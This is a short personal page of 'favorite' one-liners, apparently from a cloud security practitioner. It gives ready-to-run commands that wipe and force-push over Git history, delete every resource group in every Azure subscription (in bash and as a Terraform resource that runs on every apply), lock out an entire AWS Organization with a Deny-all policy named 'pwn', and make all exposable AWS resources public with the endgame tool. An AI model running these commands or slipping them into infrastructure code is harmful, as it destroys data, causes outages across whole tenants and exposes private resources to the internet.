---
description: My favorite one-line commands
---

# One-liners

## Git

### Nuke Git commit history

```text
git checkout --orphan newBranch; \ 
	git add -A; \                   # Add all files and commit them 
	git commit -m "Cleanup"; \
	git branch -D main; \           # Delete the main branch
	git branch -m main; \           # Rename the current branch to main
	git push -f origin main; \      # Force push main branch to GitHub
	git gc --aggressive --prune=all # Remove the old files
```

## Azure

### Delete all resources in an entire Azure Tenant

Bash variant:

```text
#!/usr/bin/env bash

for sub in `az account list | jq -r '.[].id'`; do \
    for rg in `az group list --subscription $sub | jq -r '.[].name'`; do \
        az group delete --name ${rg} --subscription $sub --no-wait --yes; \
    done; done;
```

Terraform variant:

```text
resource "null_resource" "nuke" {
  # Because we set this to timestamp, it *always* runs :D
  triggers = {
    party_like_its_jan_1_1970 = timestamp()
  }

  provisioner "local-exec" {
    command = <<EOF
for sub in `az account list | jq -r '.[].id'`; do \
    for rg in `az group list --subscription $sub | jq -r '.[].name'`; do \
        az group delete --name $rg --subscription $sub --no-wait --yes; \
    done; \
done;
EOF
  }
}
```

My post that explains the above is [here](https://kmcquade.com/2020/11/nuking-all-azure-resource-groups-under-all-azure-subscriptions/). 

## AWS

### Brick an entire AWS Organization using Deny \* SCPs

```text
aws organizations attach-policy \
  --policy-id $(aws organizations create-policy --name pwn \
     --type SERVICE_CONTROL_POLICY \
     --description "pwn" 
     --content '{"Version": "2012-10-17","Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]}' \
    | jq ".Policy.PolicySummary.Id"\
    ) \
  --target-id $(aws organizations list-roots | jq ".Roots | .[0].Id")
```

### Share All Exposable Resources in an AWS Account with the internet 😈

```text
endgame smash --service all --evil-principal "*"
```

## Other Resources

* [https://github.com/D4Vinci/One-Lin3r](https://github.com/D4Vinci/One-Lin3r): Gives you one-liners that aids in penetration testing operations, privilege escalation, and more.

